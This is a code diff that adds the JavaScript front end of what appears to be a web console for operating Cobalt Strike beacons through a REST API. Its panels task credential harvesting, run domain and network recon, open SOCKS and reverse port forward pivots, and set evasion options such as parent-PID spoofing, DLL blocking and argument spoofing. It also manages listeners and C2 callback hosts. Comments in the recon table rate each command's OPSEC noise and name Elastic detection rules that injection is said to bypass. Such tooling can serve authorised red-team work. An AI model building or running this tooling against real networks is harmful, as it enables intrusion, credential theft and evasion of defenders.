+        try {
+            const resp = await fetch(`/api/beacon/${this.selectedBid}/creds/${type}`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(extra),
+            });
+            const data = await resp.json();
+            if (data.success && (data.result?.taskId || data.data?.taskId)) {
+                // Render full CS-client output in the creds tab (same as console)
+                const _t = (data.result?.taskId || data.data?.taskId);
+                this._taskFeedKnown.add(_t); this._taskFeedPolling.add(_t);
+                this.pollTaskOutput(_t, output);
+                this._trackTaskInConsole(_t);
+                // Also refresh the vault after results come in
+                setTimeout(() => this.loadCredentialVault(), 15000);
+            } else {
+                if (output) output.innerHTML = `<div style="padding: 12px;" class="t-danger">${this.escapeHtml(data.error || 'Failed')}</div>`;
+            }
+        } catch (e) {
+            if (output) output.innerHTML = `<div style="padding: 12px;" class="t-danger">Error: ${this.escapeHtml(e.message)}</div>`;
+        }
+    },
+
+    async _pollCredResults(taskId, container, attempts = 0) {
+        if (attempts > 25) {
+            if (container) container.innerHTML += '<div class="t-warning" style="padding: 8px 12px;">Still waiting for results... check console.</div>';
+            return;
+        }
+        const delay = attempts < 3 ? 2000 : 4000;
+        await new Promise(r => setTimeout(r, delay));
+        try {
+            const resp = await fetch(`/api/beacon/task/${taskId}`);
+            const data = await resp.json();
+            if (data.success && data.task) {
+                const status = (data.task.taskStatus || data.task.status || '').toUpperCase();
+                if (status === 'OUTPUT_RECEIVED' || status === 'COMPLETED' || status === 'COMPLETE' ) {
+                    const text = this._extractTaskOutput(data.task);
+                    if (text) this._logResultToConsole(text, 'success');
+                    if (container) container.innerHTML = `<pre style="padding: 12px; white-space: pre-wrap; color: var(--text-terminal);">${this.escapeHtml(text)}</pre>`;
+                    return;
+                }
+            }
+            setTimeout(() => this._pollCredResults(taskId, container, attempts + 1), 2000);
+        } catch (e) {
+            setTimeout(() => this._pollCredResults(taskId, container, attempts + 1), 2500);
+        }
+    },
+
+    // ── Network Recon ────────────────────────────────────────────
+    // Recon command definitions with OPSEC info
+    RECON_COMMANDS: {
+        domain: { name: 'Domain Info', cmd: 'net domain', opsec: 'safe', mitre: 'T1016',
+            desc: 'Queries the AD domain name via Windows API (GetComputerNameEx). Reads cached domain info from LSA — no network traffic to DCs. On non-domain/workgroup machines returns the workgroup name or empty string.',
+            note: 'Only net subcommand with a dedicated execute endpoint (runs in-beacon, no process spawn).' },
+        computers: { name: 'Domain Computers', cmd: 'net computers', opsec: 'moderate', mitre: 'T1018',
+            desc: 'Lists hosts from Domain Computers and Domain Controllers groups via SAMR/RPC (NetGroupGetUsers) to a DC. Generates MSRPC traffic on port 445. May trigger Event 4661 (SAM object access) on the DC.',
+            note: 'Requires domain-joined machine. Fails on standalone/workgroup hosts. Optional domain parameter for cross-domain enum.' },
+        dclist: { name: 'Domain Controllers', cmd: 'net dclist', opsec: 'safe', mitre: 'T1018',
+            desc: 'Lists all DCs for a domain via DsGetDcOpen/DsGetDcNext API. Generates DNS SRV queries and lightweight RPC traffic. Low noise but not zero-traffic.',
+            note: 'Requires domain-joined machine. Optional domain parameter for cross-domain queries.' },
+        users: { name: 'List Users', cmd: 'net user', opsec: 'safe', mitre: 'T1087.001',
+            desc: 'WITHOUT target: lists LOCAL user accounts on current machine via NetUserEnum (SAMR). No network traffic — completely safe. WITH \\\\target: enumerates users on that remote system via SAMR/RPC (moderate OPSEC). Targeting a DC lists domain users (T1087.002).',
+            note: 'Does NOT use LDAP. Default behavior is local enumeration, not domain-wide.' },
+        groups: { name: 'Domain Groups', cmd: 'net group', opsec: 'moderate', mitre: 'T1069.002',
+            desc: 'Enumerates groups on a DC via NetGroupEnum API (SAMR/RPC, not LDAP). Queries the domain controller directly. May trigger Event 4661 on DC.',
+            note: 'For LOCAL group enumeration, use "net localgroup" (separate CS command). Optional target/groupName parameters.' },
+        shares: { name: 'Network Shares', cmd: 'net share', opsec: 'moderate', mitre: 'T1135',
+            desc: 'WITH target: enumerates shares on remote host via NetShareEnum API (SRVSVC pipe). Logged on target host, generates SMB/RPC traffic. WITHOUT target: lists local shares — completely safe.',
+            note: 'Elastic rule "PowerShell Share Enumeration Script" (risk 73) fires on PS-based enum, CS DLL injection bypasses it.' },
+        sessions: { name: 'Active Sessions', cmd: 'net sessions', opsec: 'moderate', mitre: 'T1049',
+            desc: 'Lists sessions on a target via NetSessionEnum API (SRVSVC pipe). Info level 10 accessible to any authenticated user. Common session-hunting technique — specifically flagged by threat intel.',
+            note: 'Some EDR monitors SRVSVC named pipe access patterns. Useful for identifying who is logged into high-value targets.' },
+        logons: { name: 'Logged-on Users', cmd: 'net logons', opsec: 'moderate', mitre: 'T1033',
+            desc: 'Lists users logged onto a target via NetWkstaUserEnum API (WKSSVC pipe). Requires target connectivity. Less commonly monitored than session enum but still generates identifiable named pipe traffic.',
+            note: 'Useful for identifying interactive users on high-value targets before token theft.' },
+        trusts: { name: 'Domain Trusts', cmd: 'net domain_trusts', opsec: 'safe', mitre: 'T1482',
+            desc: 'Enumerates domain trust relationships via DsEnumerateDomainTrusts API. Single API call to a DC — low noise but requires DC contact.',
+            note: 'Elastic rules for trust enum (DSQUERY.EXE, NLTEST.EXE) fire on those binaries — CS DLL injection bypasses them. Fails on non-domain machines.' },
+    },
+
+    _selectedRecon: null,
+
+    showReconDetail(subcmd) {
+        const info = this.RECON_COMMANDS[subcmd];
+        if (!info) return;
+        this._selectedRecon = subcmd;
+        const detail = document.getElementById('recon-detail');
+        if (!detail) return;
+        detail.style.display = '';
+        document.getElementById('recon-detail-name').textContent = info.name;
+        document.getElementById('recon-detail-cmd').textContent = info.cmd;
+        document.getElementById('recon-detail-desc').textContent = info.desc;
+
+        // OPSEC badge
+        const opsecEl = document.getElementById('recon-detail-opsec');
+        if (opsecEl) {
+            const cls = info.opsec === 'safe' ? '' : (info.opsec === 'moderate' ? 'opsec-warning--moderate' : 'opsec-warning--loud');
+            opsecEl.className = 'opsec-warning ' + cls;
+            opsecEl.textContent = 'OPSEC: ' + info.opsec.toUpperCase();
+        }
+
+        // MITRE + note
+        const mitreEl = document.getElementById('recon-detail-mitre');
+        if (mitreEl) mitreEl.textContent = info.mitre ? `MITRE: ${info.mitre}` : '';
+        const noteEl = document.getElementById('recon-detail-note');
+        if (noteEl) noteEl.textContent = info.note || '';
+
+        // Show target input for commands that support remote targeting
+        const needsTarget = ['shares', 'sessions', 'logons'].includes(subcmd);
+        const targetWrap = document.getElementById('recon-target-wrap');
+        if (targetWrap) targetWrap.style.display = needsTarget ? '' : 'none';
+
+        // Show domain input for commands that support domain parameter (via spawn endpoint)
+        const hasDomain = ['users', 'computers', 'groups', 'dclist', 'trusts'].includes(subcmd);
+        const domainWrap = document.getElementById('recon-domain-wrap');
+        if (domainWrap) domainWrap.style.display = hasDomain ? 'flex' : 'none';
+
+    },
+
+    runRecon() {
+        if (!this.selectedBid || !this._selectedRecon) return;
+        const subcmd = this._selectedRecon;
+        const info = this.RECON_COMMANDS[subcmd];
+        if (!info) return;
+
+        const target = document.getElementById('recon-target')?.value?.trim() || '';
+        const domainFlag = document.getElementById('recon-domain-flag')?.checked || false;
+        const domainName = document.getElementById('recon-domain')?.value?.trim() || '';
+
+        // Build the command naturally — same as typing in CS console
+        // e.g. "net user", "net user \\DC01", "net user /domain", "net user /domain corp.local"
+        let cmdParts = [info.cmd]; // e.g. "net user"
+        if (target) cmdParts.push(target);
+        if (domainFlag) {
+            cmdParts.push('/domain');
+            if (domainName) cmdParts.push(domainName);
+        }
+        const fullCmd = cmdParts.join(' ');
+
+        // Run via consoleCommand — CS handles the /domain flag natively
+        this._logToConsole(fullCmd, 'Recon');
+        const output = document.getElementById('recon-output');
+        if (output) output.innerHTML += `\n<span style="color: var(--terminal-prompt);">beacon&gt;</span> <span style="color: var(--text-terminal);">${this.escapeHtml(fullCmd)}</span>\n`;
+
+        // Send through the console command endpoint (handles /domain natively)
+        this._runReconCommand(fullCmd, output);
+    },
+
+    async _runReconCommand(command, output) {
+        try {
+            const resp = await fetch(`/api/beacon/${this.selectedBid}/command`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ command }),
+            });
+            const data = await resp.json();
+            if (data.success && (data.result?.taskId || data.data?.taskId)) {
+                const _t = (data.result?.taskId || data.data?.taskId);
+                this._taskFeedKnown.add(_t); this._taskFeedPolling.add(_t);
+                this.pollTaskOutput(_t, output);
+                this._trackTaskInConsole(_t);
+            } else if (!data.success) {
+                if (output) output.innerHTML += `<span style="color: var(--terminal-danger);">[-] ${this.escapeHtml(data.error || 'Failed')}</span>\n`;
+            }
+        } catch (e) {
+            if (output) output.innerHTML += `<span style="color: var(--terminal-danger);">[-] Error: ${this.escapeHtml(e.message)}</span>\n`;
+        }
+    },
+
+    confirmRunNet() {
+        if (!this._selectedRecon) return;
+        const target = document.getElementById('recon-target')?.value?.trim() || null;
+        this.runNet(this._selectedRecon, target);
+    },
+
+    async runNet(subcmd, target) {
+        if (!this.selectedBid) return;
+        const logMsg = target ? 'net ' + subcmd + ' ' + target : 'net ' + subcmd;
+        this._logToConsole(logMsg, 'Recon');
+        const output = document.getElementById('recon-output');
+        if (output) output.innerHTML += `\n<span style="color: var(--terminal-prompt);">beacon&gt;</span> <span style="color: var(--text-terminal);">net ${this.escapeHtml(subcmd)}</span>\n`;
+        try {
+            const resp = await fetch(`/api/beacon/${this.selectedBid}/net/${subcmd}`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ target: target || undefined }),
+            });
+            const data = await resp.json();
+            if (data.success && (data.result?.taskId || data.data?.taskId)) {
+                { const _t = (data.result?.taskId || data.data?.taskId); this._taskFeedKnown.add(_t); this._taskFeedPolling.add(_t); this.pollTaskOutput(_t, output); this._trackTaskInConsole(_t); }
+            } else {
+                if (output) output.innerHTML = `<div style="padding: 12px;" class="t-danger">${this.escapeHtml(data.error || 'Failed')}</div>`;
+            }
+        } catch (e) {
+            if (output) output.innerHTML = `<div style="padding: 12px;" class="t-danger">Error: ${this.escapeHtml(e.message)}</div>`;
+        }
+    },
+
+    async runPortscan() {
+        if (!this.selectedBid) return;
+        const targets = document.getElementById('portscan-targets')?.value?.trim();
+        const ports = document.getElementById('portscan-ports')?.value?.trim();
+        const method = document.getElementById('portscan-method')?.value || 'arp';
+        if (!targets || !ports) return alert('Targets and ports required');
+        this._logToConsole('portscan ' + targets + ' ' + ports + ' ' + method, 'Recon');
+        const output = document.getElementById('recon-output');
+        if (output) output.innerHTML += `\n<span style="color: var(--terminal-prompt);">beacon&gt;</span> <span style="color: var(--text-terminal);">portscan ${this.escapeHtml(targets)} ${this.escapeHtml(ports)} ${this.escapeHtml(method)}</span>\n`;
+        try {
+            const resp = await fetch(`/api/beacon/${this.selectedBid}/portscan`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ targets, ports, method }),
+            });
+            const data = await resp.json();
+            if (data.success && (data.result?.taskId || data.data?.taskId)) {
+                { const _t = (data.result?.taskId || data.data?.taskId); this._taskFeedKnown.add(_t); this._taskFeedPolling.add(_t); this.pollTaskOutput(_t, output); this._trackTaskInConsole(_t); }
+            }
+        } catch (e) {
+            if (output) output.innerHTML = `<div style="padding: 12px;" class="t-danger">Error: ${this.escapeHtml(e.message)}</div>`;
+        }
+    },
+
+    async _pollReconResults(taskId, container, label, attempts = 0) {
+        if (attempts > 25) {
+            if (container) container.innerHTML += '<div class="t-warning" style="padding: 8px 12px;">Still waiting... check console.</div>';
+            return;
+        }
+        const delay = attempts < 3 ? 2000 : 4000;
+        await new Promise(r => setTimeout(r, delay));
+        try {
+            const resp = await fetch(`/api/beacon/task/${taskId}`);
+            const data = await resp.json();
+            if (data.success && data.task) {
+                const status = (data.task.taskStatus || data.task.status || '').toUpperCase();
+                if (status === 'OUTPUT_RECEIVED' || status === 'COMPLETED' || status === 'COMPLETE' ) {
+                    const result = (Array.isArray(data.task.result) && data.task.result.length > 0 ? data.task.result : null) || data.task.output || data.task;
+                    let text;
+                    if (typeof result === 'string') {
+                        text = result;
+                    } else if (Array.isArray(result)) {
+                        // CS API returns [{output: "text", timestamp: "...", type: "text"}, ...]
+                        text = result.map(item => (typeof item === 'string' ? item : (item.output || ''))).join('\n');
+                    } else {
+                        text = result.output || JSON.stringify(result, null, 2);
+                    }
+                    if (text) this._logResultToConsole(text, 'success');
+                    if (container) {
+                        container.innerHTML = `<div class="recon-section"><div class="recon-section__title">${this.escapeHtml(label)}</div><pre style="white-space: pre-wrap; color: var(--text-primary);">${this.escapeHtml(text)}</pre></div>`;
+                    }
+                    return;
+                }
+            }
+            setTimeout(() => this._pollReconResults(taskId, container, label, attempts + 1), 2000);
+        } catch (e) {
+            setTimeout(() => this._pollReconResults(taskId, container, label, attempts + 1), 2500);
+        }
+    },
+
+    // ── Pivoting Manager ─────────────────────────────────────────
+    async startSocks() {
+        if (!this.selectedBid) return;
+        const port = document.getElementById('socks-port')?.value?.trim();
+        const version = document.getElementById('socks-version')?.value || 'socks5';
+        if (!port) return alert('Port required');
+        this._logToConsole('socks ' + port + ' ' + version, 'Pivoting');
+        const output = document.getElementById('pivot-output');
+        if (output) output.innerHTML = `<div style="padding: 12px; color: var(--info-text);">[*] Starting ${this.escapeHtml(version)} on port ${this.escapeHtml(port)}...</div>`;
+        try {
+            const resp = await fetch(`/api/beacon/${this.selectedBid}/socks/start`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ port: parseInt(port), version }),
+            });
+            const data = await resp.json();
+            if (data.success) {
+                if (output) output.innerHTML += `<div style="color: var(--success-text);">[+] SOCKS proxy task queued</div>`;
+            } else {
+                if (output) output.innerHTML += `<div style="color: var(--danger-text);">[-] ${this.escapeHtml(data.error || 'Failed')}</div>`;
+            }
+        } catch (e) { if (output) output.innerHTML += `<div style="color: var(--danger-text);">Error: ${this.escapeHtml(e.message)}</div>`; }
+    },
+
+    async stopSocks() {
+        if (!this.selectedBid) return;
+        this._logToConsole('socks stop', 'Pivoting');
+        const output = document.getElementById('pivot-output');
+        try {
+            const resp = await fetch(`/api/beacon/${this.selectedBid}/socks/stop`, { method: 'POST' });
+            const data = await resp.json();
+            if (output) output.innerHTML += `<div style="color: var(--warning-text);">[*] SOCKS stop ${data.success ? 'queued' : 'failed'}</div>`;
+        } catch (e) { /* ignore */ }
+    },
+
+    async startRportfwd() {
+        if (!this.selectedBid) return;
+        const bindPort = document.getElementById('rportfwd-bind')?.value?.trim();
+        const forwardHost = document.getElementById('rportfwd-host')?.value?.trim();
+        const forwardPort = document.getElementById('rportfwd-port')?.value?.trim();
+        if (!bindPort || !forwardHost || !forwardPort) return alert('All fields required');
+        this._logToConsole('rportfwd ' + bindPort + ' ' + forwardHost + ' ' + forwardPort, 'Pivoting');
+        const output = document.getElementById('pivot-output');
+        if (output) output.innerHTML += `<div style="color: var(--info-text);">[*] Starting rportfwd ${bindPort} → ${this.escapeHtml(forwardHost)}:${forwardPort}...</div>`;
+        try {
+            const resp = await fetch(`/api/beacon/${this.selectedBid}/rportfwd/start`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ bindPort: parseInt(bindPort), forwardHost, forwardPort: parseInt(forwardPort) }),
+            });
+            const data = await resp.json();
+            if (data.success) {
+                if (output) output.innerHTML += `<div style="color: var(--success-text);">[+] Reverse port forward task queued</div>`;
+            } else {
+                if (output) output.innerHTML += `<div style="color: var(--danger-text);">[-] ${this.escapeHtml(data.error || 'Failed')}</div>`;
+            }
+        } catch (e) { if (output) output.innerHTML += `<div style="color: var(--danger-text);">Error: ${this.escapeHtml(e.message)}</div>`; }
+    },
+
+    async stopRportfwd() {
+        if (!this.selectedBid) return;
+        const bindPort = document.getElementById('rportfwd-bind')?.value?.trim();
+        if (!bindPort) return alert('Bind port required');
+        this._logToConsole('rportfwd stop ' + bindPort, 'Pivoting');
+        const output = document.getElementById('pivot-output');
+        try {
+            const resp = await fetch(`/api/beacon/${this.selectedBid}/rportfwd/stop`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ bindPort: parseInt(bindPort) }),
+            });
+            const data = await resp.json();
+            if (output) output.innerHTML += `<div style="color: var(--warning-text);">[*] Rportfwd stop ${data.success ? 'queued' : 'failed'}</div>`;
+        } catch (e) { /* ignore */ }
+    },
+
+    // ── Beacon Config ────────────────────────────────────────────
+    async setSleep() {
+        if (!this.selectedBid) return;
+        const sleep = parseInt(document.getElementById('config-sleep')?.value?.trim() || '', 10);
+        const jitter = parseInt(document.getElementById('config-jitter')?.value?.trim() || '0', 10);
+        if (isNaN(sleep) || sleep < 0) return alert('Sleep time must be 0 or greater (seconds)');
+        if (isNaN(jitter) || jitter < 0 || jitter > 99) return alert('Jitter must be between 0 and 99');
+        this._logToConsole('sleep ' + sleep + ' ' + jitter);
+        await this._runConfigAction(`/api/beacon/${this.selectedBid}/sleep`, 'POST', `Sleep ${sleep}s ${jitter}%`, { sleep, jitter });
+    },
+
+    async setSpawnto(arch) {
+        if (!this.selectedBid) return;
+        const path = document.getElementById(`config-spawnto-${arch}`)?.value?.trim();
+        if (!path) return alert('Path required');
+        this._logToConsole('spawnto ' + arch + ' ' + path);
+        await this._runConfigAction(`/api/beacon/${this.selectedBid}/config/spawnto`, 'POST', `Spawnto ${arch}`, { arch, path });
+    },
+
+    async setPpid() {
+        if (!this.selectedBid) return;
+        const pid = document.getElementById('config-ppid')?.value?.trim();
+        if (!pid) return alert('PID required');
+        this._logToConsole('ppid ' + pid);
+        await this._runConfigAction(`/api/beacon/${this.selectedBid}/config/ppid`, 'POST', 'PPID', { pid: parseInt(pid) });
+    },
+
+    async clearPpid() {
+        if (!this.selectedBid) return;
+        this._logToConsole('ppid (clear)');
+        await this._runConfigAction(`/api/beacon/${this.selectedBid}/config/ppid`, 'DELETE', 'PPID clear');
+    },
+
+    blockdllsEnabled: false,
+
+    async toggleBlockdlls() {
+        if (!this.selectedBid) return;
+        this.blockdllsEnabled = !this.blockdllsEnabled;
+        const btn = document.getElementById('config-blockdlls-btn');
+        if (btn) {
+            btn.textContent = this.blockdllsEnabled ? 'Disable' : 'Enable';
+            btn.classList.toggle('btn-danger', this.blockdllsEnabled);
+            btn.classList.toggle('btn-success', !this.blockdllsEnabled);
+        }
+        this._logToConsole('blockdlls ' + (this.blockdllsEnabled ? 'start' : 'stop'));
+        await this._runConfigAction(`/api/beacon/${this.selectedBid}/config/blockdlls`, 'POST', `Block DLLs ${this.blockdllsEnabled ? 'enable' : 'disable'}`, { enabled: this.blockdllsEnabled });
+    },
+
+    async setArgue() {
+        if (!this.selectedBid) return;
+        const command = document.getElementById('config-argue-cmd')?.value?.trim();
+        const args = document.getElementById('config-argue-args')?.value?.trim();
+        if (!command) return alert('Command required');
+        this._logToConsole('argue ' + command + ' ' + (args || ''));
+        await this._runConfigAction(`/api/beacon/${this.selectedBid}/config/argue`, 'POST', 'Argue', { command, args: args || '' });
+    },
+
+    // ── Listener Management ──────────────────────────────────────
+
+    _renderListeners(data, body) {
+        if (data.success && data.listeners) {
+            const listeners = Array.isArray(data.listeners) ? data.listeners : [];
+            if (listeners.length === 0) {
+                body.innerHTML = '<div style="padding: 20px; text-align: center;" class="t-muted">No active listeners</div>';
+                return;
+            }
+            body.innerHTML = listeners.map(l => {
+                const name = this.escapeHtml(l.name || l.Name || 'Unknown');
+                const type = this.escapeHtml(l.type || l.payload || '');
+                const host = this.escapeHtml(l.host || l.Host || '');
+                const port = l.port || l.Port || '';
+                const lid = l.id || l.lid || l.name || '';
+                return `<div class="listener-card"><div><span class="listener-card__name">${name}</span><span class="listener-card__type">${type}</span><div class="listener-card__detail">${host}${port ? ':' + port : ''}</div></div><div class="listener-card__actions"><button onclick="BEACON.deleteListener('${this.escapeAttr(lid)}')">Delete</button></div></div>`;
+            }).join('');
+        } else {
+            body.innerHTML = `<div style="padding: 12px;" class="t-danger">${this.escapeHtml(data.error || 'Failed')}</div>`;
+        }
+    },
+
+    _updateListenerTimestamp() {
+        const tsEl = document.getElementById('listeners-last-updated');
+        if (tsEl && this._listenerCacheTime) {
+            tsEl.textContent = 'Updated ' + this._listenerCacheTime.toLocaleTimeString();
+        }
+    },
+
+    _renderListenerCache() {
+        const body = document.getElementById('listeners-body');
+        if (!body || !this._listenerCache) return;
+        this._renderListeners(this._listenerCache, body);
+        this._updateListenerTimestamp();
+    },
+
+    async loadListeners() {
+        this._logToConsole('listeners');
+        const body = document.getElementById('listeners-body');
+        if (!body) return;
+        body.innerHTML = '<div style="padding: 20px; text-align: center;" class="t-muted">Loading listeners...</div>';
+        try {
+            const resp = await fetch('/api/beacon/listeners');
+            const data = await resp.json();
+            this._renderListeners(data, body);
+            // Cache the results and update timestamp
+            this._listenerCache = data;
+            this._listenerCacheTime = new Date();
+            this._updateListenerTimestamp();
+        } catch (e) {
+            body.innerHTML = `<div style="padding: 12px;" class="t-danger">Error: ${this.escapeHtml(e.message)}</div>`;
+        }
+    },
+
+    showCreateListener() {
+        const form = document.getElementById('listener-create-form');
+        if (form) form.style.display = form.style.display === 'none' ? '' : 'none';
+    },
+
+    hideCreateListener() {
+        const form = document.getElementById('listener-create-form');
+        if (form) form.style.display = 'none';
+    },
+
+    onListenerTypeChange() {
+        const type = document.getElementById('listener-type')?.value;
+        const httpFields = document.getElementById('listener-fields-http');
+        const smbFields = document.getElementById('listener-fields-smb');
+        const tcpFields = document.getElementById('listener-fields-tcp');
+        if (httpFields) httpFields.style.display = (type === 'http' || type === 'https' || type === 'dns') ? '' : 'none';
+        if (smbFields) smbFields.style.display = type === 'smb' ? '' : 'none';
+        if (tcpFields) tcpFields.style.display = type === 'tcp' ? '' : 'none';
+    },
+
+    async createListener() {
+        const type = document.getElementById('listener-type')?.value;
+        const name = document.getElementById('listener-name')?.value?.trim();
+        if (!name) return alert('Listener name required');
+        this._logToConsole('listener_create ' + type + ' ' + name);
+        // Build config per OpenAPI spec DTOs — field names must match exactly
+        let config = { name, color: 'DEFAULT' }; // color is required for ALL listener types
+        if (type === 'http' || type === 'https') {
+            // HttpListenerDto / HttpsListenerDto: required = name, color, host, hosts, ignoreProxySettings
+            const hostVal = document.getElementById('listener-host')?.value?.trim() || '0.0.0.0';
+            const beacons = document.getElementById('listener-beacons')?.value?.trim();
+            const hosts = beacons ? beacons.split(',').map(s => s.trim()) : [hostVal];
+            config.host = hosts[0]; // stager host
+            config.hosts = hosts;   // callback hosts array
+            config.httpPort = parseInt(document.getElementById('listener-port')?.value) || (type === 'https' ? 443 : 80);
+            config.ignoreProxySettings = false;
+        } else if (type === 'dns') {
+            // DnsListenerDto: required = name, color, host, hosts
+            const hostVal = document.getElementById('listener-host')?.value?.trim() || '0.0.0.0';
+            const beacons = document.getElementById('listener-beacons')?.value?.trim();
+            const hosts = beacons ? beacons.split(',').map(s => s.trim()) : [hostVal];
+            config.host = hosts[0];
+            config.hosts = hosts;
+        } else if (type === 'smb') {
+            // SmbListenerDto: required = name, color, pipename
+            config.pipename = document.getElementById('listener-pipename')?.value?.trim() || 'msagent_##';
+        } else if (type === 'tcp') {
+            // TcpListenerDto: required = name, color, port, localHostOnly
+            config.port = parseInt(document.getElementById('listener-tcp-port')?.value) || 4444;
+            config.localHostOnly = false;
+        }
+        try {
+            const resp = await fetch(`/api/beacon/listeners/create/${type}`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(config),
+            });
+            const data = await resp.json();
+            if (data.success) {
+                this._logResultToConsole(`Listener "${name}" (${type}) created`, 'success');
+                this.hideCreateListener();
+                this.loadListeners();
+            } else {
+                this._logResultToConsole(`Listener create failed: ${data.error || 'Unknown'}`, 'error');
+            }
+        } catch (e) { this._logResultToConsole('Error: ' + e.message, 'error'); }
+    },
+
+    async deleteListener(lid) {
+        if (!confirm(`Delete listener ${lid}?`)) return;
+        this._logToConsole('listener_delete ' + lid);
+        try {
+            const resp = await fetch(`/api/beacon/listeners/${lid}`, { method: 'DELETE' });
+            const data = await resp.json();
+            this._logResultToConsole(data.success ? `Listener "${lid}" deleted` : `Error: ${data.error}`, data.success ? 'success' : 'error');
+            this.loadListeners();
+        } catch (e) { /* ignore */ }
+    },
+
+    // ════════════════════════════════════════════════════════════════
+    // BETA FEATURES — CS 4.12 REST API Integration
+    // ════════════════════════════════════════════════════════════════
+
+    // ── Beacon Gate & Syscall (Evasion Toggles) ──
+    async enableBeaconGate() {
+        if (!this.selectedBid) return;
+        this._logToConsole('beacongate enable');
+        await this._runConfigAction(`/api/beacon/${this.selectedBid}/config/beacongate/enable`, 'POST', 'Beacon Gate enable');
+    },
+
+    async disableBeaconGate() {
+        if (!this.selectedBid) return;
+        this._logToConsole('beacongate disable');
+        await this._runConfigAction(`/api/beacon/${this.selectedBid}/config/beacongate/disable`, 'POST', 'Beacon Gate disable');
+    },
+
+    async getSyscallMethod() {
+        if (!this.selectedBid) return;
+        await this._runConfigAction(`/api/beacon/${this.selectedBid}/config/syscall`, 'GET', 'Syscall method query');
+    },
+
+    async setSyscallMethod() {
+        if (!this.selectedBid) return;
+        const method = document.getElementById('config-syscall-method')?.value || 'None';
+        this._logToConsole(`syscall_method ${method}`);
+        await this._runConfigAction(`/api/beacon/${this.selectedBid}/config/syscall`, 'POST', 'Syscall method', { method });
+    },
+
+    _showConfigOutput(msg, type) {
+        const out = document.getElementById('config-output');
+        if (!out) return;
+        const color = type === 'error' ? 'var(--terminal-danger)' : type === 'success' ? 'var(--terminal-success)' : 'var(--terminal-info)';
+        out.innerHTML += `<span style="color: ${color};">[${this._timestamp()}] ${this.escapeHtml(msg)}</span>\n`;
+        out.scrollTop = out.scrollHeight;
+    },
+
+    // ── C2 Host Management ──
+    showAddC2Host() {
+        document.getElementById('c2-host-add-form').style.display = '';
+    },
+
+    async loadC2Hosts() {
+        if (!this.selectedBid) return;
+        try {
+            const resp = await fetch(`/api/beacon/${this.selectedBid}/c2/hosts`);
+            const data = await resp.json();
+            const body = document.getElementById('c2-hosts-table-body');
+            if (!body) return;
+            if (!data.success || !data.data) {
+                body.innerHTML = `<div class="feature-empty">${data.error || 'No host data available'}</div>`;
+                return;
+            }
+            const hosts = Array.isArray(data.data) ? data.data : (data.data.infos || []);
+            if (!hosts.length) {
+                body.innerHTML = '<div class="feature-empty">No callback hosts configured</div>';
+                return;
+            }
+            let html = '<table class="feature-table"><thead><tr><th>Host</th><th>URI</th><th>Status</th><th>Actions</th></tr></thead><tbody>';
+            hosts.forEach(h => {
+                const hostname = h.hostname || h.host || '';
+                const uri = h.uri || '/';
+                const held = h.held || h.status === 'held';
+                const statusBadge = held
+                    ? '<span class="host-status host-status--held">Held</span>'
+                    : '<span class="host-status host-status--active">Active</span>';
+                const actions = held
+                    ? `<button class="btn btn-sm btn-success" onclick="BEACON.releaseC2Host('${this.escapeAttr(hostname)}')">Release</button>`
+                    : `<button class="btn btn-sm btn-info" onclick="BEACON.holdC2Host('${this.escapeAttr(hostname)}')">Hold</button>
+                       <button class="btn btn-sm btn-danger" onclick="if(confirm('Remove host?')) BEACON.deleteC2Host('${this.escapeAttr(hostname)}')">Delete</button>`;
+                html += `<tr><td>${this.escapeHtml(hostname)}</td><td>${this.escapeHtml(uri)}</td><td>${statusBadge}</td><td>${actions}</td></tr>`;
+            });
+            html += '</tbody></table>';
+            body.innerHTML = html;
+        } catch (e) { document.getElementById('c2-hosts-table-body').innerHTML = '<div class="feature-empty">Error loading hosts</div>'; }
+    },
+
+    async addC2Host() {
+        if (!this.selectedBid) return;
+        const hostname = document.getElementById('c2-host-name')?.value?.trim();
+        const uri = document.getElementById('c2-host-uri')?.value?.trim() || '/';
+        if (!hostname) return;
+        try {
+            await fetch(`/api/beacon/${this.selectedBid}/c2/hosts`, {
+                method: 'POST', headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ infos: [{ hostname, uri }] }),
+            });
+            document.getElementById('c2-host-add-form').style.display = 'none';
+            this.loadC2Hosts();
+        } catch (e) { this._showConfigOutput('Failed to add host', 'error'); }
+    },
+
+    async holdC2Host(hostname) {
+        if (!this.selectedBid) return;
+        this._logToConsole('c2_host hold ' + hostname);
+        await this._runConfigAction(`/api/beacon/${this.selectedBid}/c2/hosts/hold`, 'POST', 'Hold host', { hostnames: [hostname] });
+        setTimeout(() => this.loadC2Hosts(), 3000);
+    },
+
+    async releaseC2Host(hostname) {
+        if (!this.selectedBid) return;
+        this._logToConsole('c2_host release ' + hostname);
+        await this._runConfigAction(`/api/beacon/${this.selectedBid}/c2/hosts/release`, 'POST', 'Release host', { hostnames: [hostname] });
+        setTimeout(() => this.loadC2Hosts(), 3000);
+    },
+
+    async deleteC2Host(hostname) {
+        if (!this.selectedBid) return;
+        this._logToConsole('c2_host delete ' + hostname);
+        try {
+            const resp = await fetch(`/api/beacon/${this.selectedBid}/c2/hosts`, {
+                method: 'DELETE', headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ hostnames: [hostname] }),
+            });
+            const data = await resp.json();
+            this._showConfigOutput(data.success ? `Host ${hostname} removed` : `Error: ${data.error}`, data.success ? 'success' : 'error');
+            this._logResultToConsole(data.success ? `Host ${hostname} removed` : `Error: ${data.error}`, data.success ? 'success' : 'error');
+        } catch (e) { this._showConfigOutput('Network error', 'error'); }
+        this.loadC2Hosts();
+    },
+
+    async enableFailover() {
+        if (!this.selectedBid) return;
+        await this._runConfigAction(`/api/beacon/${this.selectedBid}/c2/failover/enable`, 'POST', 'Failover notifications enable');
+    },
+
+    async disableFailover() {
+        if (!this.selectedBid) return;
+        await this._runConfigAction(`/api/beacon/${this.selectedBid}/c2/failover/disable`, 'POST', 'Failover notifications disable');
+    },
+
